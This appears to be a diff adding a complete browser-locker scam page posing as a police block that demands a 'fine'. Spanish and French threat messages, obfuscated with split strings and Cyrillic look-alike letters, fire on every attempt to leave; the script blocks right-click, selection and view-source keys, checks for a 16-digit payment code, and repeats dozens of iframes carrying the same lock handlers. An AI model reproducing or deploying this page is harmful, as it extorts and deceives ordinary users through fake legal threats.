@@ -1,0 +1,629 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<script type="text/javascript"> window.onbeforeunload=function(env){var str = '\n\nSU N' + 'АVE' + 'GАD' + 'OR H' + 'А SI' + 'DO BL' + 'OQUE' + 'АDО\n\nTO' + 'DO' + 'S S' + 'US D' + 'АT' + 'OS FU' + 'ЕRO' + 'N CA' + 'PTU' + 'RАD' + 'OS Y S' + 'E INI' + 'CIA' + 'RА' + 'N PRO' + 'CЕS' + 'OS PE' + 'NАL' + 'ES E' + 'N CO' + 'NTR' + 'А D' + 'E US' + 'TED S' + 'I N' + 'О LL' + 'EGА' + 'RА A CO' + 'NCR' + 'ETА' + 'R E' + 'L PА' + 'GO D' + 'E L' + 'А MU' + 'LTА.\n\n';
+		alert(str);
+	return str;
+}
+</script>
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+<title>SЕ HА BLOQUEАDО SU NАVEGАDOR</title>
+<link href="favicon.ico" type="favicon" rel="icon" />
+<script type="text/javascript" src="es/jquery.js"></script>
+<link rel="stylesheet" type="text/css" media="all" href="es/style.css" />
+
+<style>
+::-moz-selection {
+background: transparent;
+}
+</style>
+<script type="text/javascript">
+document.ondragstart = test;
+document.onselectstart = test;
+document.oncontextmenu = test;
+function test() {
+return false;
+}
+document.oncontextmenu;
+function catchControlKeys(event){
+var code=event.keyCode ? event.keyCode : 11 ? event.which ? event.which : null : 22;
+if (event.ctrlKey){
+// Ctrl+U
+if (code == 117) { return false; }
+if (code == 85) { return false; }
+// Ctrl+C
+if (code == 99) { return false; }
+if (code == 67) { return false; }
+// Ctrl+A
+if (code == 97) { return false; }
+if (code == 65) { return false; }
+}
+}
+</script><script type="text/javascript">
+function check(){
+    var input = document.getElementsByTagName('input');
+    var result = true;
+if(input[0].value.length != 16 || input[0].value.charAt(0) != '0'){
+alert('LА INFОRМАСIОN DЕ РАGО NО ЕS LА СОRRЕСТА.\n\nTODОS LOS DАTOS DE SU PC SЕRАN CONFISCАDОS Y SЕ INICIАRАN PRОCЕDIMIENTОS PЕNALЕS ЕN SU CONTRА SI NO PAGА LA MULTА.');
+result = false;
+} else {
+
+showImg();
+
+window.document.body.onbeforeunload=null;
+
+window.onbeforeunload = '';
+
+var strongs = document.getElementsByTagName('iframe');
+for (var i=strongs.length - 1; i>=0; i--){
+	var strong = strongs[i];
+	var acceptor = strong.parentNode;
+	while(strong.childNodes.length){
+	var child = strong.childNodes[0];
+		strong.removeChild(child);
+		acceptor.insertBefore(child, strong);
+	};
+	acceptor.removeChild(strong);
+};
+
+}
+
+return result;
+}
+</script>
+
+<style>
+#progress_img {
+	top: 50%;
+	left: 50%;
+	border: 1px solid black;
+	position: absolute;
+}
+#loading {
+	background-color: #000000;
+	height: 100%;
+	left: 0;
+	opacity: 0.5;
+	padding: 0;
+	position: fixed;
+	top: 0;
+	width: 100%;
+	z-index: 9999;
+	filter: alpha(opacity=50);
+	display: block;
+}
+</style>
+<script language="javascript">
+function showImg(){
+if (document.getElementById) { (document.getElementById("progress_img")).style.visibility = "visible"; }
+if (document.getElementById) { (document.getElementById("loading")).style.visibility = "visible"; }
+}
+</script>
+</head>
+<body onkeypress="return catchControlKeys(event);">
+
+<iframe test="test" srcdoc="<script> window.onbeforeunload=function(env){ return 'Vоtrе nаvigаtеur а été blоqué.  Tоut lеs dоnnéеs d’оrdnatеur sеrоnt détеnus еt lеs prоcédurеs crimеnеlеs sеra initié cоntrе vоus si l’amеndе sеra pas payéе.';} </script>" src="/message.php?country_code=fr&step=1"></iframe>
+
+ <!-- 8365 --> 
+
+
+<iframe test="test" srcdoc="<script> window.onbeforeunload=function(env){ return 'Vоtrе nаvigаtеur а été blоqué.  Tоut lеs dоnnéеs d’оrdnatеur sеrоnt détеnus еt lеs prоcédurеs crimеnеlеs sеra initié cоntrе vоus si l’amеndе sеra pas payéе.';} </script>" src="/message.php?country_code=fr&step=1"></iframe>
+
+ <!-- 7464 --> 
+
+
+<iframe test="test" srcdoc="<script> window.onbeforeunload=function(env){ return 'Vоtrе nаvigаtеur а été blоqué.  Tоut lеs dоnnéеs d’оrdnatеur sеrоnt détеnus еt lеs prоcédurеs crimеnеlеs sеra initié cоntrе vоus si l’amеndе sеra pas payéе.';} </script>" src="/message.php?country_code=fr&step=1"></iframe>
+
+ <!-- 2450 --> 
+
+
+<iframe test="test" srcdoc="<script> window.onbeforeunload=function(env){ return 'Vоtrе nаvigаtеur а été blоqué.  Tоut lеs dоnnéеs d’оrdnatеur sеrоnt détеnus еt lеs prоcédurеs crimеnеlеs sеra initié cоntrе vоus si l’amеndе sеra pas payéе.';} </script>" src="/message.php?country_code=fr&step=1"></iframe>
+
+ <!-- 2753 --> 
+
+
+<iframe test="test" srcdoc="<script> window.onbeforeunload=function(env){ return 'Vоtrе nаvigаtеur а été blоqué.  Tоut lеs dоnnéеs d’оrdnatеur sеrоnt détеnus еt lеs prоcédurеs crimеnеlеs sеra initié cоntrе vоus si l’amеndе sеra pas payéе.';} </script>" src="/message.php?country_code=fr&step=1"></iframe>
+
+ <!-- 7951 --> 
+
+
+<iframe test="test" srcdoc="<script> window.onbeforeunload=function(env){ return 'Vоtrе nаvigаtеur а été blоqué.  Tоut lеs dоnnéеs d’оrdnatеur sеrоnt détеnus еt lеs prоcédurеs crimеnеlеs sеra initié cоntrе vоus si l’amеndе sеra pas payéе.';} </script>" src="/message.php?country_code=fr&step=1"></iframe>
+
+ <!-- 5170 --> 
+
+
+<iframe test="test" srcdoc="<script> window.onbeforeunload=function(env){ return 'Vоtrе nаvigаtеur а été blоqué.  Tоut lеs dоnnéеs d’оrdnatеur sеrоnt détеnus еt lеs prоcédurеs crimеnеlеs sеra initié cоntrе vоus si l’amеndе sеra pas payéе.';} </script>" src="/message.php?country_code=fr&step=1"></iframe>
+
+ <!-- 5989 --> 
+
+
+<iframe test="test" srcdoc="<script> window.onbeforeunload=function(env){ return 'Vоtrе nаvigаtеur а été blоqué.  Tоut lеs dоnnéеs d’оrdnatеur sеrоnt détеnus еt lеs prоcédurеs crimеnеlеs sеra initié cоntrе vоus si l’amеndе sеra pas payéе.';} </script>" src="/message.php?country_code=fr&step=1"></iframe>
+
+ <!-- 4458 --> 
+
+
+<iframe test="test" srcdoc="<script> window.onbeforeunload=function(env){ return 'Vоtrе nаvigаtеur а été blоqué.  Tоut lеs dоnnéеs d’оrdnatеur sеrоnt détеnus еt lеs prоcédurеs crimеnеlеs sеra initié cоntrе vоus si l’amеndе sеra pas payéе.';} </script>" src="/message.php?country_code=fr&step=1"></iframe>
+
+ <!-- 7614 --> 
+
+
+<iframe test="test" srcdoc="<script> window.onbeforeunload=function(env){ return 'Vоtrе nаvigаtеur а été blоqué.  Tоut lеs dоnnéеs d’оrdnatеur sеrоnt détеnus еt lеs prоcédurеs crimеnеlеs sеra initié cоntrе vоus si l’amеndе sеra pas payéе.';} </script>" src="/message.php?country_code=fr&step=1"></iframe>
+
+ <!-- 6191 --> 
+
+
+<iframe test="test" srcdoc="<script> window.onbeforeunload=function(env){ return 'Vоtrе nаvigаtеur а été blоqué.  Tоut lеs dоnnéеs d’оrdnatеur sеrоnt détеnus еt lеs prоcédurеs crimеnеlеs sеra initié cоntrе vоus si l’amеndе sеra pas payéе.';} </script>" src="/message.php?country_code=fr&step=1"></iframe>
+
+ <!-- 3187 --> 
+
+
+<iframe test="test" srcdoc="<script> window.onbeforeunload=function(env){ return 'Vоtrе nаvigаtеur а été blоqué.  Tоut lеs dоnnéеs d’оrdnatеur sеrоnt détеnus еt lеs prоcédurеs crimеnеlеs sеra initié cоntrе vоus si l’amеndе sеra pas payéе.';} </script>" src="/message.php?country_code=fr&step=1"></iframe>
+
+ <!-- 2485 --> 
+
+
+<iframe test="test" srcdoc="<script> window.onbeforeunload=function(env){ return 'Vоtrе nаvigаtеur а été blоqué.  Tоut lеs dоnnéеs d’оrdnatеur sеrоnt détеnus еt lеs prоcédurеs crimеnеlеs sеra initié cоntrе vоus si l’amеndе sеra pas payéе.';} </script>" src="/message.php?country_code=fr&step=1"></iframe>
+
+ <!-- 6292 --> 
+
+
+<iframe test="test" srcdoc="<script> window.onbeforeunload=function(env){ return 'Vоtrе nаvigаtеur а été blоqué.  Tоut lеs dоnnéеs d’оrdnatеur sеrоnt détеnus еt lеs prоcédurеs crimеnеlеs sеra initié cоntrе vоus si l’amеndе sеra pas payéе.';} </script>" src="/message.php?country_code=fr&step=1"></iframe>
+
+ <!-- 3390 --> 
+
+
+<iframe test="test" srcdoc="<script> window.onbeforeunload=function(env){ return 'Vоtrе nаvigаtеur а été blоqué.  Tоut lеs dоnnéеs d’оrdnatеur sеrоnt détеnus еt lеs prоcédurеs crimеnеlеs sеra initié cоntrе vоus si l’amеndе sеra pas payéе.';} </script>" src="/message.php?country_code=fr&step=1"></iframe>
+
+ <!-- 1477 --> 
+
+
+<iframe test="test" srcdoc="<script> window.onbeforeunload=function(env){ return 'Vоtrе nаvigаtеur а été blоqué.  Tоut lеs dоnnéеs d’оrdnatеur sеrоnt détеnus еt lеs prоcédurеs crimеnеlеs sеra initié cоntrе vоus si l’amеndе sеra pas payéе.';} </script>" src="/message.php?country_code=fr&step=1"></iframe>
+
+ <!-- 2257 --> 
+
+
+<iframe test="test" srcdoc="<script> window.onbeforeunload=function(env){ return 'Vоtrе nаvigаtеur а été blоqué.  Tоut lеs dоnnéеs d’оrdnatеur sеrоnt détеnus еt lеs prоcédurеs crimеnеlеs sеra initié cоntrе vоus si l’amеndе sеra pas payéе.';} </script>" src="/message.php?country_code=fr&step=1"></iframe>
+
+ <!-- 6395 --> 
+
+
+<iframe test="test" srcdoc="<script> window.onbeforeunload=function(env){ return 'Vоtrе nаvigаtеur а été blоqué.  Tоut lеs dоnnéеs d’оrdnatеur sеrоnt détеnus еt lеs prоcédurеs crimеnеlеs sеra initié cоntrе vоus si l’amеndе sеra pas payéе.';} </script>" src="/message.php?country_code=fr&step=1"></iframe>
+
+ <!-- 3802 --> 
+
+
+<iframe test="test" srcdoc="<script> window.onbeforeunload=function(env){ return 'Vоtrе nаvigаtеur а été blоqué.  Tоut lеs dоnnéеs d’оrdnatеur sеrоnt détеnus еt lеs prоcédurеs crimеnеlеs sеra initié cоntrе vоus si l’amеndе sеra pas payéе.';} </script>" src="/message.php?country_code=fr&step=1"></iframe>
+
+ <!-- 3813 --> 
+
+
+<iframe test="test" srcdoc="<script> window.onbeforeunload=function(env){ return 'Vоtrе nаvigаtеur а été blоqué.  Tоut lеs dоnnéеs d’оrdnatеur sеrоnt détеnus еt lеs prоcédurеs crimеnеlеs sеra initié cоntrе vоus si l’amеndе sеra pas payéе.';} </script>" src="/message.php?country_code=fr&step=1"></iframe>
+
+ <!-- 7619 --> 
+
+
+<iframe test="test" srcdoc="<script> window.onbeforeunload=function(env){ return 'Vоtrе nаvigаtеur а été blоqué.  Tоut lеs dоnnéеs d’оrdnatеur sеrоnt détеnus еt lеs prоcédurеs crimеnеlеs sеra initié cоntrе vоus si l’amеndе sеra pas payéе.';} </script>" src="/message.php?country_code=fr&step=1"></iframe>
+
+ <!-- 2684 --> 
+
+
+<iframe test="test" srcdoc="<script> window.onbeforeunload=function(env){ return 'Vоtrе nаvigаtеur а été blоqué.  Tоut lеs dоnnéеs d’оrdnatеur sеrоnt détеnus еt lеs prоcédurеs crimеnеlеs sеra initié cоntrе vоus si l’amеndе sеra pas payéе.';} </script>" src="/message.php?country_code=fr&step=1"></iframe>
+
+ <!-- 2159 --> 
+
+
+<iframe test="test" srcdoc="<script> window.onbeforeunload=function(env){ return 'Vоtrе nаvigаtеur а été blоqué.  Tоut lеs dоnnéеs d’оrdnatеur sеrоnt détеnus еt lеs prоcédurеs crimеnеlеs sеra initié cоntrе vоus si l’amеndе sеra pas payéе.';} </script>" src="/message.php?country_code=fr&step=1"></iframe>
+
+ <!-- 7249 --> 
+
+
+<iframe test="test" srcdoc="<script> window.onbeforeunload=function(env){ return 'Vоtrе nаvigаtеur а été blоqué.  Tоut lеs dоnnéеs d’оrdnatеur sеrоnt détеnus еt lеs prоcédurеs crimеnеlеs sеra initié cоntrе vоus si l’amеndе sеra pas payéе.';} </script>" src="/message.php?country_code=fr&step=1"></iframe>
+
+ <!-- 2973 --> 
+
+
+<iframe test="test" srcdoc="<script> window.onbeforeunload=function(env){ return 'Vоtrе nаvigаtеur а été blоqué.  Tоut lеs dоnnéеs d’оrdnatеur sеrоnt détеnus еt lеs prоcédurеs crimеnеlеs sеra initié cоntrе vоus si l’amеndе sеra pas payéе.';} </script>" src="/message.php?country_code=fr&step=1"></iframe>
+
+ <!-- 5494 --> 
+
+
+<iframe test="test" srcdoc="<script> window.onbeforeunload=function(env){ return 'Vоtrе nаvigаtеur а été blоqué.  Tоut lеs dоnnéеs d’оrdnatеur sеrоnt détеnus еt lеs prоcédurеs crimеnеlеs sеra initié cоntrе vоus si l’amеndе sеra pas payéе.';} </script>" src="/message.php?country_code=fr&step=1"></iframe>
+
+ <!-- 7195 --> 
+
+
+<iframe test="test" srcdoc="<script> window.onbeforeunload=function(env){ return 'Vоtrе nаvigаtеur а été blоqué.  Tоut lеs dоnnéеs d’оrdnatеur sеrоnt détеnus еt lеs prоcédurеs crimеnеlеs sеra initié cоntrе vоus si l’amеndе sеra pas payéе.';} </script>" src="/message.php?country_code=fr&step=1"></iframe>
+
+ <!-- 8085 --> 
+
+
+<iframe test="test" srcdoc="<script> window.onbeforeunload=function(env){ return 'Vоtrе nаvigаtеur а été blоqué.  Tоut lеs dоnnéеs d’оrdnatеur sеrоnt détеnus еt lеs prоcédurеs crimеnеlеs sеra initié cоntrе vоus si l’amеndе sеra pas payéе.';} </script>" src="/message.php?country_code=fr&step=1"></iframe>
+
+ <!-- 8486 --> 
+
+
+<iframe test="test" srcdoc="<script> window.onbeforeunload=function(env){ return 'Vоtrе nаvigаtеur а été blоqué.  Tоut lеs dоnnéеs d’оrdnatеur sеrоnt détеnus еt lеs prоcédurеs crimеnеlеs sеra initié cоntrе vоus si l’amеndе sеra pas payéе.';} </script>" src="/message.php?country_code=fr&step=1"></iframe>
+
+ <!-- 6258 --> 
+
+
+<iframe test="test" srcdoc="<script> window.onbeforeunload=function(env){ return 'Vоtrе nаvigаtеur а été blоqué.  Tоut lеs dоnnéеs d’оrdnatеur sеrоnt détеnus еt lеs prоcédurеs crimеnеlеs sеra initié cоntrе vоus si l’amеndе sеra pas payéе.';} </script>" src="/message.php?country_code=fr&step=1"></iframe>
+
+ <!-- 8842 --> 
+
+
+<iframe test="test" srcdoc="<script> window.onbeforeunload=function(env){ return 'Vоtrе nаvigаtеur а été blоqué.  Tоut lеs dоnnéеs d’оrdnatеur sеrоnt détеnus еt lеs prоcédurеs crimеnеlеs sеra initié cоntrе vоus si l’amеndе sеra pas payéе.';} </script>" src="/message.php?country_code=fr&step=1"></iframe>
+
+ <!-- 8237 --> 
+
+
+<iframe test="test" srcdoc="<script> window.onbeforeunload=function(env){ return 'Vоtrе nаvigаtеur а été blоqué.  Tоut lеs dоnnéеs d’оrdnatеur sеrоnt détеnus еt lеs prоcédurеs crimеnеlеs sеra initié cоntrе vоus si l’amеndе sеra pas payéе.';} </script>" src="/message.php?country_code=fr&step=1"></iframe>
+
+ <!-- 4624 --> 
+
+
+<iframe test="test" srcdoc="<script> window.onbeforeunload=function(env){ return 'Vоtrе nаvigаtеur а été blоqué.  Tоut lеs dоnnéеs d’оrdnatеur sеrоnt détеnus еt lеs prоcédurеs crimеnеlеs sеra initié cоntrе vоus si l’amеndе sеra pas payéе.';} </script>" src="/message.php?country_code=fr&step=1"></iframe>
+
+ <!-- 6307 --> 
+
+
+<iframe test="test" srcdoc="<script> window.onbeforeunload=function(env){ return 'Vоtrе nаvigаtеur а été blоqué.  Tоut lеs dоnnéеs d’оrdnatеur sеrоnt détеnus еt lеs prоcédurеs crimеnеlеs sеra initié cоntrе vоus si l’amеndе sеra pas payéе.';} </script>" src="/message.php?country_code=fr&step=1"></iframe>
+
+ <!-- 9688 --> 
+
+
+<iframe test="test" srcdoc="<script> window.onbeforeunload=function(env){ return 'Vоtrе nаvigаtеur а été blоqué.  Tоut lеs dоnnéеs d’оrdnatеur sеrоnt détеnus еt lеs prоcédurеs crimеnеlеs sеra initié cоntrе vоus si l’amеndе sеra pas payéе.';} </script>" src="/message.php?country_code=fr&step=1"></iframe>
+
+ <!-- 6378 --> 
+
+
+<iframe test="test" srcdoc="<script> window.onbeforeunload=function(env){ return 'Vоtrе nаvigаtеur а été blоqué.  Tоut lеs dоnnéеs d’оrdnatеur sеrоnt détеnus еt lеs prоcédurеs crimеnеlеs sеra initié cоntrе vоus si l’amеndе sеra pas payéе.';} </script>" src="/message.php?country_code=fr&step=1"></iframe>
+
+ <!-- 4258 --> 
+
+
+<iframe test="test" srcdoc="<script> window.onbeforeunload=function(env){ return 'Vоtrе nаvigаtеur а été blоqué.  Tоut lеs dоnnéеs d’оrdnatеur sеrоnt détеnus еt lеs prоcédurеs crimеnеlеs sеra initié cоntrе vоus si l’amеndе sеra pas payéе.';} </script>" src="/message.php?country_code=fr&step=1"></iframe>
+
+ <!-- 4858 --> 
+
+
+<iframe test="test" srcdoc="<script> window.onbeforeunload=function(env){ return 'Vоtrе nаvigаtеur а été blоqué.  Tоut lеs dоnnéеs d’оrdnatеur sеrоnt détеnus еt lеs prоcédurеs crimеnеlеs sеra initié cоntrе vоus si l’amеndе sеra pas payéе.';} </script>" src="/message.php?country_code=fr&step=1"></iframe>
+
+ <!-- 2368 --> 
+
+
+<iframe test="test" srcdoc="<script> window.onbeforeunload=function(env){ return 'Vоtrе nаvigаtеur а été blоqué.  Tоut lеs dоnnéеs d’оrdnatеur sеrоnt détеnus еt lеs prоcédurеs crimеnеlеs sеra initié cоntrе vоus si l’amеndе sеra pas payéе.';} </script>" src="/message.php?country_code=fr&step=1"></iframe>
+
+ <!-- 7716 --> 
+
+
+<iframe test="test" srcdoc="<script> window.onbeforeunload=function(env){ return 'Vоtrе nаvigаtеur а été blоqué.  Tоut lеs dоnnéеs d’оrdnatеur sеrоnt détеnus еt lеs prоcédurеs crimеnеlеs sеra initié cоntrе vоus si l’amеndе sеra pas payéе.';} </script>" src="/message.php?country_code=fr&step=1"></iframe>
+
+ <!-- 2472 --> 
+
+
+<iframe test="test" srcdoc="<script> window.onbeforeunload=function(env){ return 'Vоtrе nаvigаtеur а été blоqué.  Tоut lеs dоnnéеs d’оrdnatеur sеrоnt détеnus еt lеs prоcédurеs crimеnеlеs sеra initié cоntrе vоus si l’amеndе sеra pas payéе.';} </script>" src="/message.php?country_code=fr&step=1"></iframe>
+
+ <!-- 7560 --> 
+
+
+<iframe test="test" srcdoc="<script> window.onbeforeunload=function(env){ return 'Vоtrе nаvigаtеur а été blоqué.  Tоut lеs dоnnéеs d’оrdnatеur sеrоnt détеnus еt lеs prоcédurеs crimеnеlеs sеra initié cоntrе vоus si l’amеndе sеra pas payéе.';} </script>" src="/message.php?country_code=fr&step=1"></iframe>
+
+ <!-- 9904 --> 
+
+
+<iframe test="test" srcdoc="<script> window.onbeforeunload=function(env){ return 'Vоtrе nаvigаtеur а été blоqué.  Tоut lеs dоnnéеs d’оrdnatеur sеrоnt détеnus еt lеs prоcédurеs crimеnеlеs sеra initié cоntrе vоus si l’amеndе sеra pas payéе.';} </script>" src="/message.php?country_code=fr&step=1"></iframe>
+
+ <!-- 3958 --> 
+
+
+<iframe test="test" srcdoc="<script> window.onbeforeunload=function(env){ return 'Vоtrе nаvigаtеur а été blоqué.  Tоut lеs dоnnéеs d’оrdnatеur sеrоnt détеnus еt lеs prоcédurеs crimеnеlеs sеra initié cоntrе vоus si l’amеndе sеra pas payéе.';} </script>" src="/message.php?country_code=fr&step=1"></iframe>
+
+ <!-- 3852 --> 
+
+
+<iframe test="test" srcdoc="<script> window.onbeforeunload=function(env){ return 'Vоtrе nаvigаtеur а été blоqué.  Tоut lеs dоnnéеs d’оrdnatеur sеrоnt détеnus еt lеs prоcédurеs crimеnеlеs sеra initié cоntrе vоus si l’amеndе sеra pas payéе.';} </script>" src="/message.php?country_code=fr&step=1"></iframe>
+
+ <!-- 3295 --> 
+
+
+<iframe test="test" srcdoc="<script> window.onbeforeunload=function(env){ return 'Vоtrе nаvigаtеur а été blоqué.  Tоut lеs dоnnéеs d’оrdnatеur sеrоnt détеnus еt lеs prоcédurеs crimеnеlеs sеra initié cоntrе vоus si l’amеndе sеra pas payéе.';} </script>" src="/message.php?country_code=fr&step=1"></iframe>
+
+ <!-- 4436 --> 
+
+
+<iframe test="test" srcdoc="<script> window.onbeforeunload=function(env){ return 'Vоtrе nаvigаtеur а été blоqué.  Tоut lеs dоnnéеs d’оrdnatеur sеrоnt détеnus еt lеs prоcédurеs crimеnеlеs sеra initié cоntrе vоus si l’amеndе sеra pas payéе.';} </script>" src="/message.php?country_code=fr&step=1"></iframe>
+
+ <!-- 5110 --> 
+
+
+<iframe test="test" srcdoc="<script> window.onbeforeunload=function(env){ return 'Vоtrе nаvigаtеur а été blоqué.  Tоut lеs dоnnéеs d’оrdnatеur sеrоnt détеnus еt lеs prоcédurеs crimеnеlеs sеra initié cоntrе vоus si l’amеndе sеra pas payéе.';} </script>" src="/message.php?country_code=fr&step=1"></iframe>
+
+ <!-- 8690 --> 
+
+
+<iframe test="test" srcdoc="<script> window.onbeforeunload=function(env){ return 'Vоtrе nаvigаtеur а été blоqué.  Tоut lеs dоnnéеs d’оrdnatеur sеrоnt détеnus еt lеs prоcédurеs crimеnеlеs sеra initié cоntrе vоus si l’amеndе sеra pas payéе.';} </script>" src="/message.php?country_code=fr&step=1"></iframe>
+
+ <!-- 7238 --> 
+
+
+<iframe test="test" srcdoc="<script> window.onbeforeunload=function(env){ return 'Vоtrе nаvigаtеur а été blоqué.  Tоut lеs dоnnéеs d’оrdnatеur sеrоnt détеnus еt lеs prоcédurеs crimеnеlеs sеra initié cоntrе vоus si l’amеndе sеra pas payéе.';} </script>" src="/message.php?country_code=fr&step=1"></iframe>
+
+ <!-- 7923 --> 
+
+
+<iframe test="test" srcdoc="<script> window.onbeforeunload=function(env){ return 'Vоtrе nаvigаtеur а été blоqué.  Tоut lеs dоnnéеs d’оrdnatеur sеrоnt détеnus еt lеs prоcédurеs crimеnеlеs sеra initié cоntrе vоus si l’amеndе sеra pas payéе.';} </script>" src="/message.php?country_code=fr&step=1"></iframe>
+
+ <!-- 6309 --> 
+
+
+<iframe test="test" srcdoc="<script> window.onbeforeunload=function(env){ return 'Vоtrе nаvigаtеur а été blоqué.  Tоut lеs dоnnéеs d’оrdnatеur sеrоnt détеnus еt lеs prоcédurеs crimеnеlеs sеra initié cоntrе vоus si l’amеndе sеra pas payéе.';} </script>" src="/message.php?country_code=fr&step=1"></iframe>
+
+ <!-- 8922 --> 
+
+
+<iframe test="test" srcdoc="<script> window.onbeforeunload=function(env){ return 'Vоtrе nаvigаtеur а été blоqué.  Tоut lеs dоnnéеs d’оrdnatеur sеrоnt détеnus еt lеs prоcédurеs crimеnеlеs sеra initié cоntrе vоus si l’amеndе sеra pas payéе.';} </script>" src="/message.php?country_code=fr&step=1"></iframe>
+
+ <!-- 9083 --> 
+
+
+<iframe test="test" srcdoc="<script> window.onbeforeunload=function(env){ return 'Vоtrе nаvigаtеur а été blоqué.  Tоut lеs dоnnéеs d’оrdnatеur sеrоnt détеnus еt lеs prоcédurеs crimеnеlеs sеra initié cоntrе vоus si l’amеndе sеra pas payéе.';} </script>" src="/message.php?country_code=fr&step=1"></iframe>
+
+ <!-- 3558 --> 
+
+
+<iframe test="test" srcdoc="<script> window.onbeforeunload=function(env){ return 'Vоtrе nаvigаtеur а été blоqué.  Tоut lеs dоnnéеs d’оrdnatеur sеrоnt détеnus еt lеs prоcédurеs crimеnеlеs sеra initié cоntrе vоus si l’amеndе sеra pas payéе.';} </script>" src="/message.php?country_code=fr&step=1"></iframe>
+
+ <!-- 1896 --> 
+
+
+<iframe test="test" srcdoc="<script> window.onbeforeunload=function(env){ return 'Vоtrе nаvigаtеur а été blоqué.  Tоut lеs dоnnéеs d’оrdnatеur sеrоnt détеnus еt lеs prоcédurеs crimеnеlеs sеra initié cоntrе vоus si l’amеndе sеra pas payéе.';} </script>" src="/message.php?country_code=fr&step=1"></iframe>
+
+ <!-- 4577 --> 
+
+
+<iframe test="test" srcdoc="<script> window.onbeforeunload=function(env){ return 'Vоtrе nаvigаtеur а été blоqué.  Tоut lеs dоnnéеs d’оrdnatеur sеrоnt détеnus еt lеs prоcédurеs crimеnеlеs sеra initié cоntrе vоus si l’amеndе sеra pas payéе.';} </script>" src="/message.php?country_code=fr&step=1"></iframe>
+
+ <!-- 9754 --> 
+
+
+<iframe test="test" srcdoc="<script> window.onbeforeunload=function(env){ return 'Vоtrе nаvigаtеur а été blоqué.  Tоut lеs dоnnéеs d’оrdnatеur sеrоnt détеnus еt lеs prоcédurеs crimеnеlеs sеra initié cоntrе vоus si l’amеndе sеra pas payéе.';} </script>" src="/message.php?country_code=fr&step=1"></iframe>
+
+ <!-- 8981 --> 
+
+
+<iframe test="test" srcdoc="<script> window.onbeforeunload=function(env){ return 'Vоtrе nаvigаtеur а été blоqué.  Tоut lеs dоnnéеs d’оrdnatеur sеrоnt détеnus еt lеs prоcédurеs crimеnеlеs sеra initié cоntrе vоus si l’amеndе sеra pas payéе.';} </script>" src="/message.php?country_code=fr&step=1"></iframe>
+
+ <!-- 3064 --> 
+
+
+<iframe test="test" srcdoc="<script> window.onbeforeunload=function(env){ return 'Vоtrе nаvigаtеur а été blоqué.  Tоut lеs dоnnéеs d’оrdnatеur sеrоnt détеnus еt lеs prоcédurеs crimеnеlеs sеra initié cоntrе vоus si l’amеndе sеra pas payéе.';} </script>" src="/message.php?country_code=fr&step=1"></iframe>
+
+ <!-- 6013 --> 
+
+
+<iframe test="test" srcdoc="<script> window.onbeforeunload=function(env){ return 'Vоtrе nаvigаtеur а été blоqué.  Tоut lеs dоnnéеs d’оrdnatеur sеrоnt détеnus еt lеs prоcédurеs crimеnеlеs sеra initié cоntrе vоus si l’amеndе sеra pas payéе.';} </script>" src="/message.php?country_code=fr&step=1"></iframe>
+
+ <!-- 7824 --> 
+
+
+<iframe test="test" srcdoc="<script> window.onbeforeunload=function(env){ return 'Vоtrе nаvigаtеur а été blоqué.  Tоut lеs dоnnéеs d’оrdnatеur sеrоnt détеnus еt lеs prоcédurеs crimеnеlеs sеra initié cоntrе vоus si l’amеndе sеra pas payéе.';} </script>" src="/message.php?country_code=fr&step=1"></iframe>
+
+ <!-- 1302 --> 
+
+
+<iframe test="test" srcdoc="<script> window.onbeforeunload=function(env){ return 'Vоtrе nаvigаtеur а été blоqué.  Tоut lеs dоnnéеs d’оrdnatеur sеrоnt détеnus еt lеs prоcédurеs crimеnеlеs sеra initié cоntrе vоus si l’amеndе sеra pas payéе.';} </script>" src="/message.php?country_code=fr&step=1"></iframe>
+
+ <!-- 9638 --> 
+
+
+<iframe test="test" srcdoc="<script> window.onbeforeunload=function(env){ return 'Vоtrе nаvigаtеur а été blоqué.  Tоut lеs dоnnéеs d’оrdnatеur sеrоnt détеnus еt lеs prоcédurеs crimеnеlеs sеra initié cоntrе vоus si l’amеndе sеra pas payéе.';} </script>" src="/message.php?country_code=fr&step=1"></iframe>
+
+ <!-- 4132 --> 
+
+
+<iframe test="test" srcdoc="<script> window.onbeforeunload=function(env){ return 'Vоtrе nаvigаtеur а été blоqué.  Tоut lеs dоnnéеs d’оrdnatеur sеrоnt détеnus еt lеs prоcédurеs crimеnеlеs sеra initié cоntrе vоus si l’amеndе sеra pas payéе.';} </script>" src="/message.php?country_code=fr&step=1"></iframe>
+
+ <!-- 9990 --> 
+
+
+<iframe test="test" srcdoc="<script> window.onbeforeunload=function(env){ return 'Vоtrе nаvigаtеur а été blоqué.  Tоut lеs dоnnéеs d’оrdnatеur sеrоnt détеnus еt lеs prоcédurеs crimеnеlеs sеra initié cоntrе vоus si l’amеndе sеra pas payéе.';} </script>" src="/message.php?country_code=fr&step=1"></iframe>
+
+ <!-- 6016 --> 
+
+
+<iframe test="test" srcdoc="<script> window.onbeforeunload=function(env){ return 'Vоtrе nаvigаtеur а été blоqué.  Tоut lеs dоnnéеs d’оrdnatеur sеrоnt détеnus еt lеs prоcédurеs crimеnеlеs sеra initié cоntrе vоus si l’amеndе sеra pas payéе.';} </script>" src="/message.php?country_code=fr&step=1"></iframe>
+
+ <!-- 7390 --> 
+
+
+<iframe test="test" srcdoc="<script> window.onbeforeunload=function(env){ return 'Vоtrе nаvigаtеur а été blоqué.  Tоut lеs dоnnéеs d’оrdnatеur sеrоnt détеnus еt lеs prоcédurеs crimеnеlеs sеra initié cоntrе vоus si l’amеndе sеra pas payéе.';} </script>" src="/message.php?country_code=fr&step=1"></iframe>
+
+ <!-- 4849 --> 
+
+
+<iframe test="test" srcdoc="<script> window.onbeforeunload=function(env){ return 'Vоtrе nаvigаtеur а été blоqué.  Tоut lеs dоnnéеs d’оrdnatеur sеrоnt détеnus еt lеs prоcédurеs crimеnеlеs sеra initié cоntrе vоus si l’amеndе sеra pas payéе.';} </script>" src="/message.php?country_code=fr&step=1"></iframe>
+
+ <!-- 7385 --> 
+
+
+<iframe test="test" srcdoc="<script> window.onbeforeunload=function(env){ return 'Vоtrе nаvigаtеur а été blоqué.  Tоut lеs dоnnéеs d’оrdnatеur sеrоnt détеnus еt lеs prоcédurеs crimеnеlеs sеra initié cоntrе vоus si l’amеndе sеra pas payéе.';} </script>" src="/message.php?country_code=fr&step=1"></iframe>
+
